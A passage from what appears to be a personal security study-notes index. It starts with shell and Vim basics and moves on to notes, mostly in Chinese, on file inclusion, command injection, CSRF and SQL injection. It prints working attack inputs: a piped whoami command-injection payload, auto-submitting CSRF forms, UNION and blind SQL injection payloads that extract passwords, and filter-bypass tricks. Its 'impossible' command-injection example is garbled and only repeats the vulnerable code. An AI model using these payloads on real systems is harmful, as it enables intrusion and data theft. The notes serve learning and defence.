script</li> <li><code>!!</code> - Entire last command, including arguments.    A common pattern: <code>sudo !!</code></li> <li><code>$_</code> - Last argument from the last command. If you are in an interactive shell, you can also quickly get this value by typing <code>Esc</code> followed by <code>.</code> or <code>Alt+.</code></li> </ul>"},{"location":"linux/shell/#return_code","title":"Return Code","text":"<p>The return code or exit status is the way scripts/commands have to communicate how execution went. A value of 0 usually means everything went OK; anything different from 0 means an error occurred.</p> <p>Exit codes can be used to conditionally execute commands using <code>&amp;&amp;</code> and <code>||</code>.  Commands can also be separated within the same line using a semicolon <code>;</code>. <pre><code>false || echo \"Oops, fail\"\n# Oops, fail\n\ntrue || echo \"Will not be printed\"\n#\n\ntrue &amp;&amp; echo \"Things went well\"\n# Things went well\n\nfalse &amp;&amp; echo \"Will not be printed\"\n#\n\ntrue ; echo \"This will always run\"\n# This will always run\n\nfalse ; echo \"This will always run\"\n# This will always run\n</code></pre></p>"},{"location":"linux/shell/#command_substitution","title":"Command Substitution","text":"<p>Whenever you place <code>$( CMD )</code> it will execute <code>CMD</code>, get the output of the command and substitute it in place</p>"},{"location":"linux/shell/#control_flow","title":"Control Flow","text":"<pre><code>#!/bin/bash\n\necho \"Starting program at $(date)\" # Date will be substituted\n\necho \"Running program $0 with $# arguments with pid $$\"\n\nfor file in \"$@\"; do\n    grep foobar \"$file\" &gt; /dev/null 2&gt; /dev/null\n    # When pattern is not found, grep has exit status 1\n    # We redirect STDOUT and STDERR to a null register since we do not care about them\n    if [[ $? -ne 0 ]]; then\n        echo \"File $file does not have any foobar, adding one\"\n        echo \"# foobar\" &gt;&gt; \"$file\"\n    fi\ndone\n</code></pre>"},{"location":"linux/shell/#execute","title":"Execute","text":"<pre><code>chmod +x example.sh\n./example.sh [param]\n</code></pre> <pre><code>sh example.sh [param]\n</code></pre>"},{"location":"linux/shell/#shell_functions_vs_scripts","title":"shell functions vs. scripts","text":"<ul> <li>Functions have to be in the same language as the shell, while scripts can be written in any language. This is why including a shebang for scripts is important.</li> <li>Functions are loaded once when their definition is read. Scripts are loaded every time they are executed. This makes functions slightly faster to load, but whenever you change them you will have to reload their definition.</li> <li>Functions are executed in the current shell environment whereas scripts execute in their own process. Thus, functions can modify environment variables, e.g. change your current directory, whereas scripts can't. Environment variables which have been exported using <code>export</code> are passed by value to scripts.</li> <li>As with any programming language, functions are a powerful construct to achieve modularity, code reuse, and clarity of shell code. Often shell scripts will include their own function definitions.</li> </ul>"},{"location":"linux/shell/#job_control","title":"Job Control","text":"<p>Shell is using a UNIX communication mechanism called a signal to communicate information to the process When a process receives a signal it stops its execution, deals with the signal and potentially changes the flow of execution based on the information that the signal delivered. For this reason, signals are software interrupts.</p>"},{"location":"linux/vim/","title":"vim","text":""},{"location":"linux/vim/#vim","title":"Vim","text":""},{"location":"linux/vim/#philosophy","title":"Philosophy","text":"<ul> <li>Vim is a modal editor: it has different modes for inserting text vs manipulating text. </li> <li>Vim is programmable (with Vimscript and also other languages like Python)</li> <li>Vim's interface itself is a programming language: keystrokes (with mnemonic names) are commands, and these commands are composable. </li> <li>Vim avoids the use of the mouse</li> <li>Vim even avoids using the arrow keys</li> </ul>"},{"location":"linux/vim/#modal_editing","title":"Modal editing","text":"<ul> <li>Normal: for moving around a file and making edits</li> <li><code>&lt;ESC&gt;</code></li> <li>Insert: for inserting text</li> <li><code>i</code></li> <li>Replace: for replacing text</li> <li><code>R</code></li> <li>Visual for selecting blocks of text</li> <li>Visual mode\uff1a <code>v</code></li> <li>Visual Line mode: <code>V</code></li> <li>Visual Block mode: <code>^V</code></li> <li>Command-line: for running a command</li> <li><code>:</code></li> </ul>"},{"location":"linux/vim/#buffers_tabs_and_windows","title":"Buffers, tabs, and windows","text":"<p>Vim maintains a set of open files, called \"buffers\".  A Vim session has a number of tabs, each of which has a number of windows (split panes). Each window shows a single buffer.  A given buffer may be open in multiple windows, even within the same tab. (unlike other programs)</p>"},{"location":"linux/vim/#command_line","title":"Command Line","text":"<ul> <li><code>:q</code> quit (close window)</li> <li><code>:w</code> save (\"write\")</li> <li><code>:wq</code> save and quit</li> <li><code>:e {name of file}</code> open file for editing</li> <li><code>:ls</code> show open buffers</li> <li><code>:help {topic}</code> open help<ul> <li><code>:help :w</code> opens help for the <code>:w</code> command</li> <li><code>:help w</code> opens help for the <code>w</code> movement</li> </ul> </li> </ul>"},{"location":"linux/vim/#vims_interface_is_a_programming_language","title":"Vim's interface is a programming language","text":""},{"location":"linux/vim/#movement","title":"Movement","text":"<p>Normal Mode</p> <p>Movements in Vim are also called \"nouns\", because they refer to chunks of text.</p> <ul> <li>Basic movement: <code>hjkl</code> (left, down, up, right)</li> <li>Words: <code>w</code> (next word), <code>b</code> (beginning of word), <code>e</code> (end of word)</li> <li>Lines: <code>0</code> (beginning of line), <code>^</code> (first non-blank character), <code>$</code> (end of line)</li> <li>Screen: <code>H</code> (top of screen), <code>M</code> (middle of screen), <code>L</code> (bottom of screen)</li> <li>Scroll: <code>Ctrl-u</code> (up), <code>Ctrl-d</code> (down)</li> <li>File: <code>gg</code> (beginning of file), <code>G</code> (end of file)</li> <li>Line numbers: <code>:{number}&lt;CR&gt;</code> or <code>{number}G</code> </li> <li>Misc: <code>%</code> (corresponding item)</li> <li>Find: <code>f{character}</code>, <code>t{character}</code>, <code>F{character}</code>, <code>T{character}</code><ul> <li>find/to forward/backward {character} on the current line</li> <li><code>,</code> / <code>;</code> for navigating matches</li> </ul> </li> <li>Search: <code>/{regex}</code>, <code>n</code> / <code>N</code> for navigating matches</li> </ul>"},{"location":"linux/vim/#selection","title":"Selection","text":"<p>Visual Mode - Visual mode\uff1a <code>v</code> - Visual Line mode: <code>V</code> - Visual Block mode: <code>^V</code></p> <p>Can use movement keys to make selection.</p>"},{"location":"linux/vim/#edit","title":"Edit","text":"<p>Vim's editing commands are also called \"verbs\", because verbs act on nouns. - <code>i</code> enter Insert mode     - but for manipulating/deleting text, want to use something more than     backspace - <code>o</code> / <code>O</code> insert line below / above - <code>d{motion}</code> delete {motion}     - e.g. <code>dw</code> is delete word, <code>d$</code> is delete to end of line, <code>d0</code> is delete     to beginning of line - <code>c{motion}</code> change {motion}     - e.g. <code>cw</code> is change word     - like <code>d{motion}</code> followed by <code>i</code> - <code>x</code> delete character (equal to <code>dl</code>) - <code>s</code> substitute character (equal to <code>cl</code>) - Visual mode + manipulation     - select text, <code>d</code> to delete it or <code>c</code> to change it - <code>u</code> to undo, <code>&lt;C-r&gt;</code> to redo - <code>y</code> to copy / \"yank\" (some other commands like <code>d</code> also copy) - <code>p</code> to paste - Lots more to learn: e.g. <code>~</code> flips the case of a character</p>"},{"location":"linux/vim/#count","title":"Count","text":"<ul> <li><code>5j</code> move 5 lines down</li> <li><code>7dw</code> delete 7 words</li> <li><code>c2w</code> change 2 words</li> </ul>"},{"location":"linux/vim/#modifiers","title":"Modifiers","text":"<ul> <li><code>i</code>: in</li> <li><code>a</code>: around</li> </ul> <p>examples:</p> <ul> <li><code>ci(</code> change the contents inside the current pair of parentheses</li> <li><code>ci[</code> change the contents inside the current pair of square brackets</li> <li><code>da'</code> delete a single-quoted string, including the surrounding single quotes</li> </ul>"},{"location":"linux/vim/#customizing_vim","title":"Customizing Vim","text":""},{"location":"owasp/File%20Inclusion/","title":"File Inclusion","text":""},{"location":"owasp/File%20Inclusion/#file_inclusion","title":"File Inclusion","text":""},{"location":"owasp/File%20Inclusion/#_1","title":"\u6587\u4ef6\u5305\u542b","text":"<p>PHP\u4e3a\u4e86\u63d0\u9ad8\u4ee3\u7801\u590d\u7528\u6027\uff0c\u63d0\u4f9b\u4e86\u6587\u4ef6\u5305\u542b\u51fd\u6570 include() , require(), require_once()\u548cinclude_once()\uff0c\u88ab\u5305\u542b\u7684\u6587\u4ef6\u5185\u5bb9\u4f1a\u88ab\u5f53\u505a\u4ee3\u7801\u6765\u6267\u884c\uff1b\u5373\u628a\u91cd\u590d\u4f7f\u7528\u7684\u4e00\u6bb5\u4ee3\u7801\uff0c\u5355\u72ec\u5199\u5230\u4e00\u4e2a\u6587\u4ef6\u91cc\uff0c\u518d\u7528\u6587\u4ef6\u5305\u542b\u51fd\u6570\u6765\u5305\u542b\u8fd9\u4e2a\u6587\u4ef6\uff1b \u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff1a\u4e3a\u4e86\u7075\u6d3b\u7684\u5305\u542b\u6587\u4ef6\uff0c\u4e00\u4e9b\u7a0b\u5e8f\u5458\u4f1a\u628a\u6587\u4ef6\u540d\u901a\u8fc7\u53c2\u6570\u7684\u5f62\u5f0f\u4f20\u9012\u7ed9\u6587\u4ef6\u5305\u542b\u51fd\u6570\u3002\u5f53\u4f20\u9012\u6587\u4ef6\u540d\u7684\u53c2\u6570\u88ab\u7528\u6237\u4fee\u6539\u65f6\uff0c\u7528\u6237\u5c31\u53ef\u4ee5\u5305\u542b\u4efb\u610f\u6587\u4ef6\uff0c\u800c\u6587\u4ef6\u4e2d\u7684\u4ee3\u7801\u5c31\u4f1a\u88ab\u670d\u52a1\u5668\u6267\u884c\uff0c\u8fd9\u5c31\u9020\u6210\u4e86\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e</p>"},{"location":"owasp/File%20Inclusion/#_2","title":"\u6587\u4ef6\u5305\u542b\u51fd\u6570","text":"<p>PHP\u63d0\u4f9b\u4e86\u56db\u4e2a\u6587\u4ef6\u5305\u542b\u51fd\u6570\uff1a 1\uff09include() \uff1a\u5f53\u88ab\u5305\u542b\u7684\u6587\u4ef6\u4e0d\u5b58\u5728\u65f6\uff0c\u4f1a\u62a5\u9519\uff08Error\uff09\uff0c\u540e\u9762\u7684\u4ee3\u7801\u4e0d\u88ab\u6267\u884c\uff1b 2\uff09 include_once() \uff1a\u53ea\u5305\u542b\u4e00\u6b21\uff0c\u5305\u542b\u8fc7\u7684\u6587\u4ef6\u4e0d\u4f1a\u88ab\u91cd\u590d\u5305\u542b\uff1b 3\uff09 require() \uff1a\u5f53\u88ab\u5305\u542b\u7684\u6587\u4ef6\u4e0d\u5b58\u5728\u65f6\uff0c\u4f1a\u544a\u8b66\uff08Wrainng\uff09\uff0c\u540e\u9762\u7684\u4ee3\u7801\u53ef\u4ee5\u7ee7\u7eed\u6267\u884c\uff1b 4\uff09require_once()\uff1a\u53ea\u5305\u542b\u4e00\u6b21\uff0c\u5305\u542b\u8fc7\u7684\u6587\u4ef6\u4e0d\u4f1a\u88ab\u91cd\u590d\u5305\u542b\u3002 \u6587\u4ef6\u5305\u542b\u51fd\u6570\u4e0d\u5173\u5fc3\u6587\u4ef6\u7684\u540e\u7f00\u540d\uff0c\u5b83\u53ea\u662f\u7b80\u5355\u7684\u6267\u884c\u88ab\u5305\u542b\u7684\u6587\u4ef6\uff0c\u5982\u679c\u6587\u4ef6\u7684\u5185\u5bb9\u662f\u4ee3\u7801\uff0c\u5c31\u4f1a\u6267\u884c\u4ee3\u7801\uff1b\u5982\u679c\u4e0d\u662f\u4ee3\u7801\uff0c\u5c31\u5f53\u505a\u6587\u672c\u8f93\u51fa\u5230\u9875\u9762\uff1b</p> <pre><code>&lt;?php\n\n// The page we wish to display\n$file = $_GET[ 'page' ];\n\n?&gt;\n</code></pre>"},{"location":"owasp/File%20Inclusion/#_3","title":"\u672c\u5730\u6587\u4ef6\u5305\u542b","text":"<p>\u5305\u542b\u670d\u52a1\u5668\u672c\u5730\u7684\u6587\u4ef6\u3002</p> <p>\u672c\u5730\u6587\u4ef6\u5305\u542b\u7684payload\u901a\u5e38\u4ee5\u6839\u76ee\u5f55\uff08/\uff09\u6216\u6587\u4ef6\u540d\u5f00\u5934\u3002\u4e5f\u5c31\u662f\u7edd\u5bf9\u8def\u5f84\u548c\u76f8\u5bf9\u8def\u5f84\u3002</p> <p>\u5229\u7528\u6761\u4ef6\uff1a\u914d\u7f6e\u6587\u4ef6\u5f00\u542ffopen\uff08allow_url_fopen=On\uff09 \u7528\u6237\u53ef\u63a7\u53c2\u6570\uff0c\u540e\u53f0\u672a\u8fc7\u6ee4\u5305\u542b\u7684\u6587\u4ef6\u3002</p>"},{"location":"owasp/File%20Inclusion/#_4","title":"\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b","text":"<p>\u5305\u542b\u8fdc\u7aef\u7684\u6587\u4ef6\u3002</p> <p>\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u7684payload\u901a\u5e38\u4ee5 http:// \u6216 ftp:// \u5f00\u5934\u3002</p> <p>\u5229\u7528\u6761\u4ef6\uff1a\u914d\u7f6e\u6587\u4ef6\u5f00\u542f fopen \u548c include\uff08allow_url_include=On\uff09 \u7528\u6237\u53c2\u6570\u53ef\u63a7\uff0c\u4e14\u540e\u53f0\u6ca1\u6709\u8fc7\u6ee4\u5305\u542b\u7684\u6587\u4ef6\u3002</p>"},{"location":"owasp/File%20Upload/","title":"File Upload","text":""},{"location":"owasp/File%20Upload/#file_upload","title":"File Upload  <p>File Upload\uff0c\u5373\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u901a\u5e38\u662f\u7531\u4e8e\u5bf9\u4e0a\u4f20\u6587\u4ef6\u7684\u7c7b\u578b\u3001\u5185\u5bb9\u6ca1\u6709\u8fdb\u884c\u4e25\u683c\u7684\u8fc7\u6ee4\u3001\u68c0\u67e5\uff0c\u4f7f\u5f97\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u4e0a\u4f20\u6728\u9a6c\u83b7\u53d6\u670d\u52a1\u5668\u7684webshell\u6743\u9650</p>","text":""},{"location":"owasp/command%20injection/","title":"Command Injection","text":""},{"location":"owasp/command%20injection/#command_injection","title":"Command Injection","text":"<p><pre><code>if( stristr( php_uname( 's' ), 'Windows NT' ) ) {\n        // Windows\n        $cmd = shell_exec( 'ping  ' . $target );\n    }\n    else {\n        // *nix\n        $cmd = shell_exec( 'ping  -c 4 ' . $target );\n    }\n</code></pre> payload: <pre><code>127.0.0.1|whoami\n</code></pre> impossible: <pre><code>if( stristr( php_uname( 's' ), 'Windows NT' ) ) {\n        // Windows\n        $cmd = shell_exec( 'ping  ' . $target );\n    }\n    else {\n        // *nix\n        $cmd = shell_exec( 'ping  -c 4 ' . $target );\n    }\n</code></pre></p>"},{"location":"owasp/csrf/","title":"CSRF","text":""},{"location":"owasp/csrf/#csrf_--_cross_site_request_forgery","title":"CSRF -- Cross Site Request Forgery","text":""},{"location":"owasp/csrf/#cookie_and_session_management","title":"Cookie and Session Management","text":""},{"location":"owasp/csrf/#cookie_attributes","title":"Cookie Attributes","text":"<p>Every cookie is a name-value pair <pre><code>Set-Cookie: sessionid=abc123; Domain=example.com\n</code></pre> These additional cookie attributes help the browser determine which cookies should be attached to each request. - The Domain and Path attributes tell the browser which URLs to send the cookie to. See the next section for more details. - The Secure attribute tells the browser to only send the cookie over a secure HTTPS connection. - The HttpOnly attribute prevents JavaScript from accessing and modifying the cookie. - The expires field tells the browser when to stop remembering the cookie.</p>"},{"location":"owasp/csrf/#session","title":"Session","text":"<p>\u670d\u52a1\u5668\u7aef\u200b\u200b\u7ef4\u62a4\u7684\u7528\u6237\u72b6\u6001\u4fe1\u606f</p>"},{"location":"owasp/csrf/#session_management","title":"Session Management","text":"<p>Cookies are often used to keep users logged in to a website over many requests and responses.  When a user sends a login request with a valid username and password, the server will generate a new session token and send it to the user as a cookie. In future requests, the browser will attach the session token cookie and send it to the server. The server maintains a mapping of session tokens to users, so when it receives a request with a session token cookie, it can look up the corresponding user and customize its response accordingly.</p> <ul> <li>Session tokens are the values that the browser sends to the server to associate the request with a logged-in user. </li> <li>Cookies are how the browser stores and sends session tokens to the server. Cookies can also be used to save other state (attributes). </li> </ul>"},{"location":"owasp/csrf/#csrf","title":"CSRF","text":"<p>In a cross-site request forgery (CSRF) attack, the attacker forces the victim to make an unintended request. The victim\u2019s browser will automatically attach the session token cookie to the unintended request, and the server will accept the request as coming from the victim.</p>"},{"location":"owasp/csrf/#html_csrf","title":"HTML CSRF","text":"<p>\u5229\u7528 html \u5143\u7d20\u53d1\u9001 GET \u8bf7\u6c42 <pre><code>&lt;link href=\"\"&gt;\n&lt;img src=\"\"&gt;\n&lt;img lowsrc=\"\"&gt;\n&lt;img dynsrc=\"\"&gt;\n&lt;meta http-equiv=\"refresh\" content=\"0; url=\"&gt;\n&lt;iframe src=\"\"&gt;\n&lt;frame src=\"\"&gt;\n&lt;script src=\"\"&gt;&lt;/script&gt;\n&lt;bgsound src=\"\"&gt;&lt;/bgsound&gt;\n&lt;embed src=\"\"&gt;&lt;/bgsound&gt;\n&lt;video src=\"\"&gt;&lt;/video&gt;\n&lt;audio src=\"\"&gt;&lt;/audio&gt;\n&lt;a href=\"\"&gt;&lt;/a&gt;\n&lt;table background=\"\"&gt;&lt;/table&gt;\n......\n</code></pre> <pre><code>&lt;img src=\"https://bank.com/transfer?amount=100&amp;recipient=mallory\" /&gt;\n</code></pre></p> <p>POST \u8868\u5355 <pre><code>&lt;form action=\"http://www.a.com/register\" id=\"register\" method=\"post\"&gt;\n  &lt;input type=text name=\"username\" value=\"\" /&gt;\n  &lt;input type=password name=\"password\" value=\"\" /&gt;\n&lt;/form&gt;\n&lt;script&gt;\n  var f = document.getElementById(\"register\");\n  f.inputs[0].value = \"test\";\n  f.inputs[1].value = \"passwd\";\n  f.submit();\n&lt;/script&gt;\n</code></pre></p> <p>CSS  <pre><code>@import \"\"\nbackground:url(\"\")\n......\n</code></pre></p>"},{"location":"owasp/csrf/#_1","title":"\u9632\u5fa1","text":"<p>\u9a8c\u8bc1\u7801 \u9a8c\u8bc1\u7801\u5f3a\u5236\u7528\u6237\u5fc5\u987b\u4e0e\u5e94\u7528\u8fdb\u884c\u4ea4\u4e92\uff0c\u624d\u80fd\u5b8c\u6210\u6700\u7ec8\u8bf7\u6c42\u3002</p> <p>Referer Check \u68c0\u67e5\u8bf7\u6c42\u662f\u5426\u6765\u81ea\u5408\u6cd5\u7684\u6e90\u3002\u4f46\u670d\u52a1\u5668\u5e76\u975e\u4ec0\u4e48\u65f6\u5019\u90fd\u80fd\u53d6\u5f97 Referer\u3002</p> <p>CSRF Token  When a legitimate user loads a webpage from the server with a form, the server will randomly generate a CSRF token and include it as an extra field in the form. When the user submits the form, the form will include the CSRF token, and the server will check that the CSRF token is valid. - \u968f\u673a\u6027 - \u751f\u547d\u5468\u671f\u77ed - \u4fdd\u5bc6\u6027\uff0c\u5982\u679c Token \u51fa\u73b0\u5728 URL \u4e2d\uff0c\u5219\u53ef\u80fd\u4f1a\u901a\u8fc7 Referer \u6cc4\u9732\uff0c\u5e94\u5c3d\u91cf\u628a Token \u653e\u5728\u8868\u5355\u4e2d\uff0c\u628a\u654f\u611f\u64cd\u4f5c\u7531 GET \u6539\u4e3a POST\uff0c\u4ee5\u8868\u5355\u6216 AJAX \u7684\u5f62\u5f0f\u63d0\u4ea4\uff0c\u907f\u514d Token \u6cc4\u9732\u3002</p>"},{"location":"owasp/sql%20injection/","title":"SQL Injection","text":""},{"location":"owasp/sql%20injection/#sql_injection","title":"SQL Injection  <p>\u6839\u636e\u7f51\u7ad9\u529f\u80fd\uff0c\u731c\u6d4b\u53ef\u80fd\u7684SQL\u8bed\u53e5 SELECT col_name(\u2026) FROM table_name WHERE id = {}       /\u6570\u5b57\u578b/ SELECT col_name(\u2026) FROM table_name WHERE id = '{}'     /\u5b57\u7b26\u578b/</p>","text":""},{"location":"owasp/sql%20injection/#_1","title":"\u5224\u65ad\u6570\u5b57\u578b / \u5b57\u7b26\u578b","text":"<ol> <li>\u4f20\u5165id=1: \u6b63\u5e38\u9875\u9762</li> <li>\u518d\u4f20\u5165id=2-1 </li> <li> <p>\u5982\u679c\u662f\u6570\u5b57\u578b\uff0c\u8bed\u53e5\u5e94\u8be5\u53d8\u4e3a\uff1a <pre><code>SELECT col_name(\u2026) FROM table_name WHERE id = 2-1 \n</code></pre> \u7b49\u4ef7\u4e8e\uff1a <pre><code>SELECT col_name(\u2026) FROM table_name WHERE id = 1 \n</code></pre> \u90a3\u4e48\u5c31\u5e94\u8be5\u80fd\u6b63\u5e38\u8fd4\u56deid=1\u7684\u9875\u9762</p> </li> <li> <p>\u5982\u679c\u662f\u5b57\u7b26\u578b\uff0c\u8bed\u53e5\u5e94\u8be5\u53d8\u4e3a\uff1a <pre><code>SELECT col_name(\u2026) FROM table_name WHERE id = '2-1'\n</code></pre> \u4f1a\u56e0\u4e3a\u67e5\u8be2\u4e0d\u5230\u5185\u5bb9</p> </li> </ol>"},{"location":"owasp/sql%20injection/#-","title":"\u5b57\u7b26\u578b -&gt; \u5224\u65ad\u5f15\u53f7\u7c7b\u578b","text":"<p>\u6709\u62a5\u9519\u56de\u663e | payload  |  \u5355\u5f15\u53f7 |\u53cc\u5f15\u53f7| |---|---|---| |  id=' |  ''' \u62a5\u9519 |\"'\"| |  id=\"  |  '\"' |\"\"\" \u62a5\u9519|</p> <p>\u65e0\u62a5\u9519\u56de\u663e |  payload | \u5355\u5f15\u53f7  |\u53cc\u5f15\u53f7| |---|---|---| |  id=adm''in | user found  |not found|</p>"},{"location":"owasp/sql%20injection/#_2","title":"\u6709\u56de\u663e","text":"<p>UNION SELECT</p> <p>\u8054\u5408\u67e5\u8be2\u524d\u540e\u7684\u5217\u6570\u5fc5\u987b\u4e00\u81f4\uff0c\u9700\u8981\u5224\u65ad\u539fSQL\u67e5\u8be2\u7684\u5217\u6570 <pre><code>id=1' ORDER BY M#\nid=1' UNION SELECT 1, 2,...#\n</code></pre> \u83b7\u53d6\u57fa\u672c\u4fe1\u606f <pre><code>id=' UNION SELECT DATABASE(), USER(),...\n</code></pre> \u83b7\u53d6\u66f4\u591a\u4fe1\u606f</p> <p>\u5728MySQL\u4e2d\uff0c\u6240\u6709\u7684\u6570\u636e\u5e93\u540d\u5b58\u653e\u5728information_schema.schemata\u7684schema_name\u5b57\u6bb5\u4e0b <pre><code>SELECT schema_name FROM information_schema.schemata;\n</code></pre> \u6240\u6709\u7684\u8868\u540d\u5b58\u653e\u5728information_schema.tables\u7684table_name\u5b57\u6bb5\u4e0b\uff0c\u53ef\u4ee5\u4ee5table_schema\u4e3a\u6761\u4ef6\u7b5b\u9009 <pre><code>SELECT table_name FROM information_schema.tables WHERE table_schema='db_name';\n</code></pre> \u6240\u6709\u7684\u5217\u540d\u5b58\u653e\u5728information_schema.columns\u7684column_name\u5b57\u6bb5\u4e0b\uff0c\u53ef\u4ee5\u4ee5table_schema\u548ctable_name\u4e3a\u6761\u4ef6\u7b5b\u9009 <pre><code>SELECT column_name FROM information_schema.columns WHERE table_name='table_name' \nAND table_schema='db_name';\n</code></pre></p> <p>pyaload eg. <pre><code>id = 4 UNION SELECT group_concat(schema_name), 2, 3 FROM information_schema.schemata\n</code></pre></p> <p>\u83b7\u53d6\u5230\u8868\u3001\u5217\u540d\u540e\uff0c\u53ef\u4ee5\u83b7\u53d6\u5176\u4ed6\u6570\u636e eg. users\u8868\u4e2d\u7684passwd\u5b57\u6bb5 - group_concat() \u5408\u5e76\u8bfb\u53d6 <pre><code>id = 4 UNION SELECT group_concat(passwd), 2, 3 FROM users;\n</code></pre> - LIMIT\u5206\u884c\u8bfb\u53d6 <pre><code>id = 4 UNION SELECT passwd, 2, 3 FROM users LIMIT 0, 1;\n</code></pre></p>"},{"location":"owasp/sql%20injection/#_3","title":"\u65e0\u56de\u663e","text":"<p>\u5e03\u5c14\u76f2\u6ce8 - <code>and</code> / <code>&amp;&amp;</code> - \u524d\u9762\u662f\u6709\u6548id\u65f6 - <code>or</code> / <code>||</code> - \u524d\u9762\u662f\u65e0\u6548id\u65f6</p> <p>\u7528SUBSTR()\u4e00\u4f4d\u4f4d\u53d6\u51fa\u8981\u67e5\u627e\u5185\u5bb9\u7684\u5b57\u7b26\uff0c\u518d\u7528ASCII()\u8f6c\u5316\u4e3aASCII\u7801\uff0c\u5c31\u80fd\u7528\u4e8c\u5206\u6cd5\u83b7\u53d6\u6570\u636e - SUBSTR(str, pos, len) - ASCII(char) <pre><code>name=a' or ASCII(SUBSTR((SELECT GROUP_CONCAT(passwd) FROM users), 1, 1))&gt;0#\n</code></pre></p> <p>\u5ef6\u65f6\u6ce8\u5165 - IF(condition, expr1, expr2) - SLEEP() <pre><code>name=admin' and IF(ASCII(SUBSTR(DATABASE(), 1, 1))&gt;0, SLEEP(0), SLEEP(2))\n</code></pre></p> <p>\u62a5\u9519\u6ce8\u5165 <pre><code>name=admin' AND extractvalue(1, concat(0x7e, (SELECT ...), 0x7e)) -- - \nname=admin' AND updatexml(1,concat(0x7e,(SELECT ...),0x7e),1)-- -\n</code></pre></p> <p>\u5806\u53e0\u6ce8\u5165 \u5f88\u591a\u6570\u636e\u5e93\u662f\u652f\u6301\u591a\u4e2aSQL\u6307\u4ee4\u5728\u4e00\u884c\u5185\u6267\u884c\u7684,\u4f46\u670d\u52a1\u7aef\u8bed\u8a00\u53ef\u80fd\u4e0d\u4f1a\u83b7\u53d6\u591a\u884c\u7ed3\u679c</p> <p>\u5e38\u89c1\u5224\u65ad\u65b9\u6cd5\uff1a <pre><code>;select sleep(1);#\n</code></pre></p> <p>\u4e8c\u6b21\u6ce8\u5165 \u653b\u51fb\u8005\u5148\u5c06\u6076\u610f\u6570\u636e\u5b58\u5165\u6570\u636e\u5e93\uff0c\u4e4b\u540e\u5f53\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u8fd9\u4e9b\u6570\u636e\u65f6\u89e6\u53d1\u6ce8\u5165</p>"},{"location":"owasp/sql%20injection/#_4","title":"\u9632\u62a4 &amp; \u7ed5\u8fc7","text":""},{"location":"owasp/sql%20injection/#_5","title":"\u9632\u62a4","text":"<ul> <li>\u76f4\u63a5\u62e6\u622a</li> <li>\u5173\u952e\u5b57\u66ff\u6362</li> <li>\u7f16\u7801\u8f6c\u4e49</li> <li>\u53c2\u6570\u5316\u67e5\u8be2</li> </ul>"},{"location":"owasp/sql%20injection/#_6","title":"\u68c0\u6d4b","text":"<ul> <li>\u5173\u952e\u5b57\u5339\u914d(\u76f4\u63a5\u67e5\u627e/\u6b63\u5219)</li> <li>\u8bed\u4e49\u5339\u914d</li> </ul>"},{"location":"owasp/sql%20injection/#_7","title":"\u7ed5\u8fc7","text":"<p>\u9488\u5bf9\u5173\u952e\u5b57/\u6b63\u5219\u5339\u914d - \u5927\u5c0f\u5199 - \u5229\u7528\u7b49\u4ef7\u547d\u4ee4 \u6bd4\u5982 OR-&gt;||, SPACE-&gt;/**/, ORDER BY-&gt;GROUP BY \u2026 - \u5982\u679c\u53ea\u662f\u5355\u7eaf\u5220\u53bb\u5173\u952e\u5b57\uff0c\u4e14\u53ea\u5220\u4e00\u6b21\uff0c\u53ef\u4ee5\u5d4c\u5957\u7ed5\u8fc7\uff0c\u6bd4\u5982UNION\u662f\u5173\u952e\u5b57\u4f1a\u88ab\u5220\u9664\uff0c \u90a3\u4e48\u4f20\u5165UNUNIONION\u5c31\u4f1a\u88ab\u5220\u6210UNION\uff0c\u4ece\u800c\u6ce8\u5165 - \u7ed5\u8fc7\u5f15\u53f7 <pre><code>-- hex \u7f16\u7801\nSELECT * FROM Users WHERE username = 0x61646D696E\n-- char() \u51fd\u6570\nSELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)\n</code></pre> \u5bbd\u5b57\u8282\u6ce8\u5165\uff1a \u5982\u679c\u6570\u636e\u5e93\u4f7f\u7528\u7684\u662fGBK\u7f16\u7801\uff0c\u800c\u670d\u52a1\u7aef\u53ea\u91c7\u7528addslashes()\u65b9\u6cd5\u8fdb\u884c\u8f6c\u4e49\uff0c\u53ef\u80fd\u9020\u6210\u9003\u9038\u3002\u6bd4\u5982addslashes(\"%df'\")=\"%df\\'\" \u4f20\u7ed9SQL\u670d\u52a1\u5668\u65f6\u5341\u516d\u8fdb\u5236\u7f16\u7801\u4e3a df 5c 27 \u800c\u5728GBK\u7f16\u7801\u4e0b\uff0cdf 5c\u662f\u6c49\u5b57\u904b\u7684\u7f16\u7801\uff0c\u6700\u540e\u8fd9\u6bb5\u5b57\u7b26\u4f1a\u88ab\u6570\u636e\u5e93\u7406\u89e3\u4e3a\u904b'\uff0c\u5bfc\u81f4\u8f6c\u4e49\u5931\u6548\uff0c\u5355\u5f15\u53f7\u9003\u9038</p> <ul> <li>\u5b57\u7b26\u4e32\u62fc\u63a5 <pre><code>SELECT 'a' 'd' 'mi' 'n';\nSELECT CONCAT('a', 'd', 'm', 'i', 'n');\nSELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');\nSELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');\n</code></pre></li> </ul> <p>\u9488\u5bf9\u8bed\u4e49\u5339\u914d \u76f8\u5bf9\u96be\u5ea6\u8f83\u5927\uff0c\u53ea\u80fd\u5229\u7528\u8bed\u8a00\u7279\u6027\u628a\u8bed\u4e49\u68c0\u6d4b\u7ed5\u6655\u3002\u5e38\u89c1\u529e\u6cd5\u662f\u5d4c\u5957\u6ce8\u91ca\u7b26\u8ba9\u5176\u4ee5\u4e3a\u5168\u90e8\u5185 \u5bb9\u90fd\u88ab\u6ce8\u91ca\u4e86\u3002  e.g.  <pre><code>id = 1/*#*/union select 1, 2, 3\nid = 1 and \"/*\"=\"\" union select 1, 2, 3#*/\n</code></pre></p>"},{"location":"owasp/xss/","title":"XSS","text":""},{"location":"owasp/xss/#xss_--_cross-site_scripting","title":"XSS -- Cross-Site Scripting  